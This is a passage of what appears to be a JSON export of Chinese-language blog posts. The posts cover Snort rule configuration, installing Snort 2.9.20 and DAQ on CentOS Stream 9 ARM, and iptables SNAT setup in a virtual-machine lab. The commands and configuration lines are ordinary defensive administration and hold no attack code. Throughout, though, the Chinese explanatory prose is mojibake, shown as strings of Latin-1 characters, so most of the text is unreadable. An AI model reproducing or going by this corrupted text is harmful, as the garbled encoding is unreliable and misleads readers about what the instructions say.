æˆ‘é€‰æ‹©äº†æ³¨å†Œç‰ˆï¼Œä»¥ä¸‹éƒ½ä»¥æ³¨å†Œç‰ˆè¿›è¡Œæ¼”ç¤ºã€‚ æ³¨å†Œé“¾æ¥ oinkcode æ³¨å†ŒæˆåŠŸåï¼Œä¼šç»™ä¸€ä¸ªoinkcodeï¼Œåœ¨ä¸ªäººä¿¡æ¯ä¸­å¯ä»¥æ‰¾åˆ° ç„¶åå°±å¯ä»¥ä¸‹è½½è§„åˆ™äº†ï¼Œå°†oinkcode&#x3D;xxxï¼Œxxxæ¢æˆè‡ªå·±çš„ 1wget https://snort.org/downloads/registered/snortrules-snapshot-29200.tar.gz?oinkcode=xxx -O ~/registered.tar.gz Tips: å¦‚æœä¸‹è½½å®Œæˆåè§£å‹å¤±è´¥çš„è¯ï¼Œå¯ä»¥åœ¨ç‰©ç†æœºä¸‹è½½å¥½ï¼Œç„¶åscpä¸Šä¼  1scp /Users/gryffinbit/Downloads/snortrules-snapshot-29200.tar.gz root@10.211.55.12:/root/ å¤åˆ¶è§„åˆ™ ä¸‹è½½å®Œæˆåï¼Œå°†è§„åˆ™è§£å‹åˆ°snorté…ç½®æ–‡ä»¶å¤¹ /etc/snort 1tar xvf snortrules-snapshot-29200.tar.gz -C /etc/snort é…ç½®ç½‘ç»œå’Œè§„åˆ™å·²ç»æœ‰äº†é…ç½®ä»¥åŠè§„åˆ™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹snort.confçš„å˜é‡ã€‚ 1vim /etc/snort/snort.conf ä¿®æ”¹snort.confçš„å†…å®¹ è®¾ç½®éœ€è¦ä¿æŠ¤çš„ipåœ°å€ï¼Œå…ˆç”¨è¿™å°centosçš„ipï¼Œä½œä¸ºæµ‹è¯•æ—¶çš„ip 12# Setup the network addresses you are protectingipvar HOME_NET server_public_ip/24 12# Set up the external network addresses. Leave as &quot;any&quot; in most situationsipvar EXTERNAL_NET !$HOME_NET 1234# Path to your rules files (this can be a relative path)var RULE_PATH /etc/snort/rulesvar SO_RULE_PATH /etc/snort/so_rulesvar PREPROC_RULE_PATH /etc/snort/preproc_rules 123# Set the absolute path appropriatelyvar WHITE_LIST_PATH /etc/snort/rulesvar BLACK_LIST_PATH /etc/snort/rules åœ¨setp6é‡Œï¼Œè®¾ç½®è¾“å‡º 123# unified2# Recommended for most installsoutput unified2: filename snort.log, limit 128 æ³¨é‡Šæ‰Step #7é‡Œé¢æ²¡æœ‰çš„è§„åˆ™ 1sudo sed -i &#x27;s/include \\$RULE\\_PATH/#include \\$RULE\\_PATH/&#x27; /etc/snort/snort.conf ç¿»åˆ°æœ€ä¸‹é¢ï¼Œæ‰¾åˆ°è§„åˆ™é›†åˆ—è¡¨ã€‚æ‰“å¼€local.rulesçš„æ³¨é‡Šï¼Œä»¥å…è®¸snortè£…è½½ä¸ªæ€§åŒ–è§„åˆ™é›†ã€‚ 1include $RULE_PATH/local.rules ä¿å­˜ç¼–è¾‘:wq æµ‹è¯•æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œ 1snort -T -c /etc/snort/snort.conf è¿è¡ŒæˆåŠŸ æ·»åŠ åŸºç¡€è§„åˆ™è¿›è¡Œæµ‹è¯•1vim /etc/snort/rules/local.rules 1alert icmp any any -&gt; $HOME_NET any (msg:&quot;ICMP test&quot;; sid:10000001; rev:001;) å¼€å¯snort 1snort -A console -i enp0s6 -u snort -g snort -c /etc/snort/snort.conf é‡‡ç”¨-A console æ¥æ‰“å°å‡ºå‘Šè­¦ä¿¡æ¯ã€‚éœ€è¦é€‰æ‹©æ­£ç¡®çš„ç½‘ç»œæ¥å£ï¼Œæ¯”å¦‚eth0 è§Blogï¼šSNATç½‘ç»œç¯å¢ƒé…ç½®ã€‚æ¥å£é€‰ç”¨äº†enp0s6ï¼ˆè¿æ¥å†…ç½‘çš„æ¥å£ï¼‰ å‘èµ·æ”»å‡» å…³äºç½‘å£çš„é€‰æ‹©ã€‚nat serveræ˜¯åšä¸€ä¸ªåœ°å€è½¬æ¢çš„ï¼Œä½¿å¾—å†…ç½‘æœºå™¨å¯ä»¥è®¿å¤–ç½‘ã€‚æ‰€ä»¥åœ¨åšè¿™ä¸ªè§„åˆ™çš„æ—¶å€™ï¼Œsnort.conf HOME_NETé‡Œï¼Œå¦‚æœæ˜¯æƒ³å¯¹å¤–éƒ¨è®¿é—®å†…éƒ¨çš„æµé‡è¿›è¡Œç›‘æ§ï¼Œå°±å°†è¿™ä¸ªIPï¼Œå†™æˆnat serverå¤–ç½‘ç½‘å¡çš„IPã€‚å› ä¸ºå¤–ç½‘å®é™…ä¸èƒ½ç›´æ¥è®¿é—®åˆ°å†…ç½‘çš„æœºå™¨çš„ï¼Œéƒ½æ˜¯åªèƒ½è®¿é—®åˆ°é‚£ä¸ªç½‘å…³çš„å…¬ç½‘IPã€‚æ‰€ä»¥åœ¨SNATè¿™ä¸ªç½‘ç»œç¯å¢ƒé‡Œï¼Œæƒ³é™åˆ¶ç‰©ç†æœºï¼ˆweb serverï¼‰è®¿é—®å†…éƒ¨æœºå™¨çš„è¯ï¼Œå°±è¦snortç›‘å¬enp0s5è¿™ä¸ªå¤–ç½‘ç½‘å¡ï¼Œsnort.confçš„IPå†™å¤–ç½‘ç½‘å…³IPã€‚å¦‚æœæ˜¯æƒ³è®©å†…éƒ¨çš„ç½‘ç»œä¹‹é—´æœ‰é™åˆ¶ï¼Œå°±å†™å†…ç½‘çš„ç½‘æ®µï¼Œç›‘å¬enp0s6 æŸ¥çœ‹æ—¥å¿—snortä¼šå°†æ£€æµ‹ç»“æœè®°å½•åœ¨æ—¥å¿— 1snort -r /var/log/snort/snort.log.timestamp timestampæ˜¯æ—¶é—´æˆ³ï¼Œæ¯ä¸ªæ—¥å¿—ä¼šæœ‰æ—¶é—´æˆ³çš„è®°å½• * snortåå°è¿è¡Œä¸‹è½½å¼€æœºè‡ªå¯åŠ¨è„šæœ¬ 12wget https://www.snort.org/documents/snort-startup-script-for-centos -O ~/snortdsudo chmod 755 ~/snortd &amp;&amp; sudo mv ~/snortd /etc/init.d/ é‡è½½ 1sudo systemctl daemon-reload å¼€å¯æœåŠ¡ 1sudo systemctl start snortd ä¹Ÿå¯ä»¥æŸ¥çœ‹çŠ¶æ€ã€åœæ­¢æœåŠ¡ã€å¼€å¯æœåŠ¡ç­‰ 1stop, restart, status 1sudo systemctl status snortd é™„å½•ï¼šsnort æ–‡ä»¶éƒ¨ç½²è·¯å¾„snortå®‰è£…åŒ…æ‰€åœ¨è·¯å¾„ã€ç›¸å…³æ–‡æ¡£ 1/home/parallels/snortFile docï¼šsnortçš„ä¸€äº›è¯´æ˜æ–‡æ¡£æ‰€åœ¨æ–‡ä»¶å¤¹ snortè§„åˆ™æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ 1cd /etc/snort snortæ—¥å¿—æ–‡ä»¶ 1cd /var/log/snort snortè¿è¡Œ 1/usr/local/bin/snort å‚è€ƒæ–‡ç« snortå®˜æ–¹é…ç½®","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARMæ¶æ„","slug":"ARMæ¶æ„","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallelsè™šæ‹Ÿæœº","slug":"parallelsè™šæ‹Ÿæœº","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"Gryffinbit"},{"title":"centos-stream-9ä¸‹å®‰è£…snort2.9ã€ARMè™šæ‹Ÿæœºç‰ˆã€‘","slug":"centos-stream-9ä¸‹å®‰è£…snort2-9ã€ARMè™šæ‹Ÿæœºç‰ˆã€‘","date":"2022-07-25T10:04:18.000Z","updated":"2024-11-12T06:59:48.000Z","comments":true,"path":"2022/07/25/centos-stream-9ä¸‹å®‰è£…snort2-9ã€ARMè™šæ‹Ÿæœºç‰ˆã€‘/","permalink":"https://gryffinbit.top/2022/07/25/centos-stream-9%E4%B8%8B%E5%AE%89%E8%A3%85snort2-9%E3%80%90ARM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%89%88%E3%80%91/","excerpt":"","text":"å‰è¨€å®‰è£…centosçš„ç›¸å…³é…ç½®ï¼Œè·³è½¬Blogï¼š centOS-Stream9ARMåŸºç¡€é…ç½® tips: snortçš„ç¯å¢ƒæ˜¯åœ¨centosçš„SNATå¿«ç…§ä¸‹è¿›ä¸€æ­¥å®‰è£…çš„ï¼Œä½†ç”±äºæ— æ³•è®¿é—®äº’è”ç½‘ï¼Œæ‰€ä»¥ä¼šå…ˆå°†enp0s5ï¼ˆå¤–ç½‘ç½‘å¡ï¼‰åˆ‡æ¢æˆå…±äº«ç½‘ç»œæ¨¡å¼ï¼Œä¸”è§£é™¤ç»‘å®šçš„å›ºå®šIPï¼Œä¸åœ¨éœ€è¦è”ç½‘ç¯å¢ƒæ—¶ï¼Œå†æ¢å¤åˆ°SNATæ—¶çš„ç½‘ç»œç¯å¢ƒ psï¼š snortå®˜æ–¹æ–‡æ¡£é‡Œé¢ç»™å‡ºçš„ç‰ˆæœ¬ï¼Œæ‰æ›´æ–°åˆ°centos8ï¼Œsnort 2.9.16.1 ã€‚æˆ‘æ ¹æ®è¿™ä¸ªå®˜æ–¹æ–‡æ¡£ï¼ŒæŠŠsnort-2.9.20å®‰è£…åœ¨äº†centos9-streamã€‚æˆ–è®¸æœ‰äº›æœªçŸ¥é”™è¯¯ã€‚å¦‚æœå‘ç°äº†ï¼Œè¯·åœ¨è¯„è®ºåŒºäº¤æµå­¦ä¹ ã€‚ ç¯å¢ƒé…ç½®CentOS: CentOS-Stream-9, ARM, Parallelsè™šæ‹Ÿæœº CentOSæ“ä½œç”¨æˆ·ï¼šåœ¨rootç”¨æˆ·ä¸‹è¿›è¡Œsnortéƒ¨ç½² snortç‰ˆæœ¬ï¼šsnort-2.9.20 daqç‰ˆæœ¬ï¼š daq-2.0.7 CentOSæºï¼šé˜¿é‡Œæº æ›´æ”¹dnfçš„æºå¤‡ä»½ 1mv /etc/yum.repos.d/centos.repo /etc/yum.repos.d/centos.repo.backup æ¢æˆé˜¿é‡Œæº 1vim /etc/yum.repos.d/centos.repo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that may be useful#[extras]#name=CentOS-$releasever - Extras - mirrors.aliyun.com#failovermethod=priority#baseurl=https://mirrors.aliyun.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/#gpgcheck=1#gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[PowerTools]name=CentOS-$releasever - PowerTools - mirrors.aliyun.comfailovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[AppStream]name=CentOS-$releasever - AppStream - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 1dnf makecache æ›´æ–°ç³»ç»Ÿè½¯ä»¶å‡çº§æ‰€æœ‰åŒ…åŒæ—¶ä¹Ÿå‡çº§è½¯ä»¶å’Œç³»ç»Ÿå†…æ ¸ 12dnf update -ydnf install epel-release -y æ›´æ­£æ—¶é—´ 1sudo timedatectl set-timezone Asia/Shanghai ä¸‹è½½æ–‡ä»¶å°†ä¸‹è½½çš„æ–‡ä»¶ä¸Šä¼ åˆ°centos åœ¨å®˜ç½‘ä¸‹è½½daqå’Œsnort2.9çš„åŒ…ï¼šhttps://snort.org/downloads#sources ç”¨ç‰©ç†æœºä¸‹è½½æ–‡ä»¶ï¼ŒæŠŠä»–ä»¬ä¸Šä¼ åˆ°centos 12wget https://snort.org/downloads/snort/daq-2.0.7.tar.gzwget https://snort.org/downloads/snort/snort-2.9.20.tar.gz æ–°å»ºsnortæ–‡ä»¶å¤¹ æ–°çš„snortæ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾è§£å‹å¥½çš„åˆšåˆšä¸‹è½½çš„ä¸¤ä¸ªæ–‡ä»¶ã€‚ 1234cd /home/rootmkdir snortFiletar -zxvf daq-2.0.7.tar.gz -C snortFiletar -zxvf snort-2.9.20.tar.gz -C snortFile å®‰è£…ç›¸å…³ä¾èµ–å®‰è£…å¿…è¦çš„ç¯å¢ƒ 1dnf install gcc gcc-c++ libnetfilter_queue-devel git flex bison zlib zlib-devel pcre pcre-devel libdnet tcpdump libnghttp2 wget xz-devel -y 1dnf install make cmake automake autoconf libtool -y æŠ¥é”™æ‰¾ä¸åˆ°è¿™ä¸ªåŒ…ï¼šlibnetfilter_queue-devel æ·»åŠ ä»“åº“ CRB 1vim /etc/yum.repos.d/centos.repo æœ€åä¸€è¡ŒåŠ å…¥ 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 1dnf makecache å†æ¬¡å®‰è£…è¿™ä¸ªåŒ… 1dnf --enablerepo=crb install libnetfilter_queue-devel -y å®‰è£…snortä¾èµ– 1dnf install libpcap-devel pcre-devel libdnet-devel hwloc-devel openssl-devel zlib-devel luajit-devel pkgconf libmnl-devel libunwind-devel -y æŠ¥é”™ Error: Unable to find a match: libmnl-devel æ¢repoé‡æ–°å®‰è£… 1dnf install libmnl 1dnf --enablerepo=crb install libmnl-devel -y é—®é¢˜è§£å†³ï¼ å®‰è£…daqä¾èµ– 12dnf install libnfnetlink-devel libnetfilter_queue-devel -ydnf install libtirpc-devel å®‰è£…daqå®‰è£…daqæ•°æ®é‡‡é›†åº“ 123cd snortFile/daq-2.0.7./configuremake &amp;&amp; make install 123vim ~/.bash_profile# æ·»åŠ è·¯å¾„PATH=$PATH:/usr/local/bin æ£€æŸ¥æ‰€éœ€ä¾èµ–æ˜¯å¦éƒ½å®‰è£…æˆåŠŸ 123which dnet-configwhich pcre-configwhich daq-modules-config å®‰è£…snortè¿›å…¥åˆ°snortå®‰è£…åŒ…è·¯å¾„ 1cd snortFile/snort-2.9.20 ç¼–è¯‘ 123./configure --enable-sourcefiresudo makemake install ç¼–è¯‘æˆåŠŸ snortå®‰è£…æˆåŠŸ 1snort -v Ctrl + c é€€å‡º å‚è€ƒæ–‡ç« centos8 snortå®‰è£…æ–‡æ¡£ snort3 centos 8 streamå®˜æ–¹å®‰è£…æ–‡æ¡£ å„ä¸ªç‰ˆæœ¬å®‰è£…æ–‡æ¡£ é˜¿é‡Œcrbåº“ æ‰¾ä¸åˆ°çš„åº“ï¼Œå°±å»æŸ¥å®˜æ–¹ï¼ä¼šç»™å‡ºä¸‹è½½å‘½ä»¤ã€ä»“åº“ç­‰å„ç§é…ç½®","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARMæ¶æ„","slug":"ARMæ¶æ„","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallelsè™šæ‹Ÿæœº","slug":"parallelsè™šæ‹Ÿæœº","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"Gryffinbit"},{"title":"iptablesé…ç½®SNATå®ç°å…±äº«ä¸Šç½‘","slug":"iptablesé…ç½®SNATå®ç°å…±äº«ä¸Šç½‘","date":"2022-07-22T13:55:19.000Z","updated":"2024-11-12T06:59:37.000Z","comments":true,"path":"2022/07/22/iptablesé…ç½®SNATå®ç°å…±äº«ä¸Šç½‘/","permalink":"https://gryffinbit.top/2022/07/22/iptables%E9%85%8D%E7%BD%AESNAT%E5%AE%9E%E7%8E%B0%E5%85%B1%E4%BA%AB%E4%B8%8A%E7%BD%91/","excerpt":"","text":"å®éªŒç¯å¢ƒè™šæ‹Ÿæœºå‡é€šè¿‡parallels desktop 17 å®‰è£… Ubuntu: Ubuntu 20.04.2 ARM64 ã€clientå†…ç½‘å®¢æˆ·æœºã€‘ CentOSï¼šCentOS-Stream-9-latest-aarch64-dvd1 ã€NAT serverã€‘ macOS: macOS Monterey. M1, 2020, ARM64ã€ç‰©ç†æœº Web serverã€‘ Ubutntuçš„iptablesç‰ˆæœ¬ï¼šiptables v1.8.4 (legacy) CentOSçš„ iptablesç‰ˆæœ¬ï¼šiptables v1.8.8 (nf_tables) IPé…ç½®ï¼š è®¾å¤‡ IPåœ°å€ ç½‘å…³ macOS ï¼ˆweb serverï¼Œå¤–ç½‘ç¯å¢ƒï¼‰ 192.168.117.2 192.168.117.1 centOS ï¼ˆNAT serverï¼Œå†…å¤–ç½‘ç¯å¢ƒï¼‰ Enp0s6 å¤–ç½‘IPï¼š 192.168.117.1 Enp0s5 å†…ç½‘IPï¼š 10.37.129.1 ubuntu ï¼ˆclientï¼Œå†…ç½‘ç¯å¢ƒï¼‰ 10.37.129.6 10.37.129.1 ç½‘ç»œæ‹“æ‰‘ï¼š åŸç†è§£é‡ŠNAT serverï¼šå°†IPåœ°å€è½¬æ¢å¦å¤–ä¸€ä¸ªIPï¼Œå†…éƒ¨IPæƒ³è¦è®¿é—®å¤–ç½‘æ—¶ï¼ŒNATå®ç°å†…éƒ¨å’Œå¤–éƒ¨ç½‘ç»œçš„è½¬æ¢ã€‚NATä¸€èˆ¬éƒ¨ç½²åœ¨è¿æ¥å†…ç½‘å’Œå¤–ç½‘çš„ç½‘å…³è®¾å¤‡æˆ–è€…å†…å¤–ç½‘ä¹‹é—´çš„é˜²ç«å¢™ä¸Šã€‚ é€šå¸¸NATçš„ä¸¤ä¸ªç½‘å¡ï¼Œè¿æ¥å†…ç½‘çš„æ˜¯å†…ç½‘çš„ç½‘å…³ï¼Œè¿æ¥å¤–ç½‘çš„æ˜¯ä¸€ä¸ªå…¬æœ‰åœ°å€ã€‚ WEB serverï¼šå……å½“å…¬ç½‘çš„æœåŠ¡ï¼Œéœ€è¦å’Œå†…ç½‘è¿›è¡Œäº¤äº’è¿æ¥ SNATï¼šæŠŠæ•°æ®åŒ…çš„æºåœ°å€ç”±ç§ç½‘IPè½¬æ¢æˆå…¬ç½‘IPã€‚å½“ç›¸åº”çš„æ•°æ®åŒ…ä»å…¬ç½‘å‘åˆ°å†…ç½‘æ—¶ï¼Œä¼šæŠŠæ•°æ®åŒ…çš„ç›®çš„åœ°å€ç”±å…¬ç½‘IPè½¬æ¢æˆç§ç½‘IPã€‚ä¸åŒå†…ç½‘ä¸»æœºä¼šé€šè¿‡ç«¯å£å·è¿›è¡ŒåŒºåˆ†ã€‚ å¦‚ä½•å®ç°çš„å…±äº«ç½‘ç»œï¼š å¤–ç½‘è®¿é—®å†…ç½‘ç”¨æˆ·æ—¶ã€‚NATçš„å†…ç½‘æœåŠ¡è·¯ç”±å™¨æ”¶åˆ°å†…ç½‘çš„å›åº”æŠ¥æ–‡åï¼Œæ ¹æ®è¯¥å›åº”æŠ¥æ–‡çš„â€œæºIPåœ°å€+æºç«¯å£å·â€æ‰¾å‡ºå¯¹åº”çš„å…¬ç½‘IP+ç«¯å£å·ï¼Œç„¶åç”¨æŸ¥æ‰¾ç»“æœæ›¿æ¢æŠ¥æ–‡çš„æºIPåœ°å€+æºç«¯å£å· å¼€å¯iptablesæœåŠ¡ CentOSé»˜è®¤æ˜¯ä½¿ç”¨ firewalld æœåŠ¡ä½œä¸ºé˜²ç«å¢™ï¼Œæˆ‘ä»¬éœ€è¦ç¦ç”¨è¯¥æœåŠ¡ï¼Œå®‰è£… iptables æœåŠ¡ã€‚ æ­¤æ—¶ç½‘å¡é€‰ç”¨å…±äº«ç½‘ç»œæ¨¡å¼ 1ã€åœæ­¢ firewall æœåŠ¡ 1systemctl stop firewalld 2ã€æ³¨é”€ firewall æœåŠ¡ 1systemctl mask firewalld 3ã€å®‰è£… iptables æœåŠ¡ 12sudo yum install -y iptables sudo yum install -y iptables-services 4ã€å¯åŠ¨ iptables æœåŠ¡ 1systemctl start iptables æˆ–è€… 1service iptables start 5ã€è®¾ç½® iptables å¼€æœºè‡ªå¯åŠ¨ 1systemctl enable iptables 6ã€æŸ¥çœ‹ iptables çŠ¶æ€ 1systemctl status iptables æˆ–è€… 1service iptables status Activeæ˜¯æ¿€æ´»çŠ¶æ€ æŒ‰qï¼Œè¿”å›å‘½ä»¤è¡Œæ¨¡å¼ 7ã€æŸ¥çœ‹ iptables æ–‡ä»¶ æ­¤æ—¶å¯ä»¥åœ¨ /etc/sysconfig/ ç›®å½•ä¸‹çœ‹åˆ° iptables æ–‡ä»¶ iptables æ–‡ä»¶çš„åˆå§‹å†…å®¹å¦‚ä¸‹ï¼š å¸¸è§iptablesæœåŠ¡å‘½ä»¤ï¼š 1ã€iptables æœåŠ¡çš„åœæ­¢å‘½ä»¤å¦‚ä¸‹ï¼š 1systemctl stop iptables æˆ–è€… 1service iptables stop 2ã€iptables æœåŠ¡çš„é‡å¯å‘½ä»¤å¦‚ä¸‹ï¼š 1systemctl restart iptables æˆ–è€… 1service iptables restart 3ã€ä¿å­˜ iptables æ–‡ä»¶ä¿®æ”¹ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1service iptables save 4ã€é‡è½½ iptables æ–‡ä»¶ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1systemctl reload iptables æˆ–è€… 1service iptables reload 5ã€æŸ¥çœ‹å·²é…ç½®çš„iptablesè§„åˆ™ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1ï¼‰ä¸å¸¦ç¼–å· 1iptables -n -L 2ï¼‰å¸¦ç¼–å· 1iptables -n -L --line-numbers ç¯å¢ƒæ­å»º ç½‘ç»œç¯å¢ƒä¸è¦é€‰æ‹©å…¬å¸æ’ç½‘çº¿çš„é‚£ç§ç¯å¢ƒï¼é€‰ç”¨å®¶åº­ç½‘ç»œæˆ–è€…æ‰‹æœºWi-Fiå……å½“ä¸€ä¸‹ã€‚æˆ‘ç›®å‰è§‰å¾—æ˜¯å…¬å¸ç½‘ç»œé˜²ç«å¢™é…ç½®å¯¼è‡´äº†ä¸¢åŒ…ç‡å¾ˆé«˜ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å¤±è´¥ï¼ 1. è™šæ‹Ÿæœºå‡†å¤‡ é…ç½®å¥½ubuntuå’Œcentosï¼ŒåŸºæœ¬åŠŸèƒ½å…·å¤‡ï¼Œè¿™é‡Œä¸åœ¨èµ˜è¿°ï¼Œåœ¨ä»¥å¾€çš„blogé‡Œæœ‰è®°å½• 2. ç½‘å¡é…ç½® ubuntuä½œä¸ºå†…ç½‘å®¢æˆ·æœºï¼Œåªéœ€åˆ†é…ä¸€ä¸ªç½‘å¡ centosä½œä¸ºnat serveréœ€è¦ä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªå¯¹å†…è¿æ¥ï¼Œå¯ä»¥å’Œå†…ç½‘æœºå™¨äº¤äº’ã€‚ä¸€ä¸ªå¯¹å¤–è¿æ¥ï¼Œå’Œå¤–ç½‘äº¤äº’ã€‚ 3. IPè®¾å®šå’Œé…ç½® macOSç‰©ç†æœºï¼Œå……å½“webserverçš„è§’è‰²ã€‚ï¼ˆmacé€šè¿‡è®¾ç½® -&gt; ç½‘ç»œï¼ŒæŸ¥çœ‹ç½‘å…³ï¼‰ IPåœ°å€ ç½‘å…³ 192.168.117.2 192.168.117.1 centosï¼Œå……å½“NATseverçš„è§’è‰² åœ¨centos ç½‘ç»œè®¾ç½®é¡µé¢ä¿®æ”¹IP è¿æ¥å¤–ç½‘çš„IPåœ°å€ è¿æ¥å†…ç½‘çš„IPåœ°å€ 192.168.117.1ã€æ¡¥æ¥æ¨¡å¼-&gt;é»˜è®¤é€‚é…å™¨ï¼Œenp0s5ã€‘ 10.37.129.1 ã€host-onlyï¼Œenp0s6ã€‘ ubuntuï¼Œå……å½“å®¢æˆ·æœºè§’è‰² æ‰‹åŠ¨è®¾ç½®IP ç½‘å¡çš„IPå’Œç½‘å…³ä¸€å®šè¦å†™æ­»äº†ï¼ä¸ç„¶å°±ä¼šæ€»å‡ºç°é—®é¢˜ï¼Œå¦å¤–æ¯æ¬¡è¿›å…¥è™šæ‹Ÿæœºçš„æ—¶å€™ï¼ŒæŠŠå„ä¸ªç½‘å¡éƒ½é‡å¯ä¸€ä¸‹.éƒ½é€‰æ‹©æ‰‹åŠ¨æ–¹å¼é…ç½® ç»‘å®šIPå’Œæ©ç  1sudo ifconfig eth0 10.37.129.6 netmask 255.255.255.0 è®¾ç½®ç½‘å…³ 1sudo route add default gw 10.37.129.1 æŸ¥çœ‹è·¯ç”± 1route -n IPåœ°å€ ç½‘å…³ 10.37.129.6 10.37.129.1 æ²¡æœ‰é…ç½®SNATæ—¶ï¼Œä¸‰å°ä¸»æœºä¹‹é—´çš„ç½‘ç»œäº’é€šæƒ…å†µ èƒ½å¦pingé€š ubuntuï¼ˆclientï¼‰ centosï¼ˆnat serverï¼‰ macOS ï¼ˆweb serverï¼‰ ubuntu âœ…å¯ä»¥pingé€šç½‘å…³10.37.129.1 âŒ ä¸èƒ½pingé€š centos âœ… å¯ä»¥pingé€š âœ… å¯ä»¥pingé€š macOS âœ… å¯ä»¥pingé€š è¿›è¡ŒSNATè½¬æ¢ è¦å®ç°çš„æ•ˆæœï¼Œclientå¯ä»¥è®¿é—®web serverï¼Œä½†éœ€è¦é€šè¿‡NATï¼Œåœ°å€è½¬æ¢ä¸º192.168.117.1è®¿é—® 1. NAT serverå¼€å¯è·¯ç”±è½¬å‘ 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 1å¼€å¯ï¼Œ0å…³é—­ 1vim /etc/sysctl.conf æ‰“å¼€æ³¨é‡Š 1net.ipv4.ip_forward = 1 æ‰§è¡Œä¿®æ”¹ 1sysctl -p 2. NAT server è®¾ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°SNATåœ°å€è½¬æ¢ SNATæ˜¯åœ¨postroutingé“¾è¡¨çš„ã€‚åœ°å€è½¬æ¢ï¼Œå°†å†…ç½‘çš„ç½‘æ®µï¼Œè½¬æ¢ä¸ºå¤–ç½‘çš„IPï¼Œå³å¤–ç½‘å‡ºå£çš„é‚£ä¸ªç½‘å…³åœ°å€ã€‚ ç”¨curlå»æµ‹çš„è¯ï¼Œå¼€80ç«¯å£ 1iptables -t nat -A POSTROUTING -s 10.37.129.0/24 -p tcp --dport 80 -j SNAT --to-source 192.168.117.1 ç”¨pingæµ‹çš„è¯ï¼Œèµ°icmpåè®® 1iptables -t nat -A POSTROUTING -s 10.37.129.0/24 -p icmp -j SNAT --to-source 192.168.117.1 å°†è¿™æ¡è½¬å‘ï¼Œæ°¸ä¹…å†™å…¥nat server 1service iptables save 